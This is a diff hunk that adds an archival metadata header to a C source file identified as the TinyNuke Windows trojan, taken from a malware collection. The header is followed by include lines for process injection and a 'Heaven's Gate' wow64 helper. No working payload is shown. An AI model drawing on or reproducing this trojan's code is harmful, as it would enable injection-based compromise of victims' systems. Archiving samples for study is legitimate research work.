@@ -1,3 +1,14 @@
+/*
+  name      TinyNuke
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 #include "inject.h"
 #if HEAVENS_GATE && !_WIN64 
    #include "wow64ext\wow64ext.h"
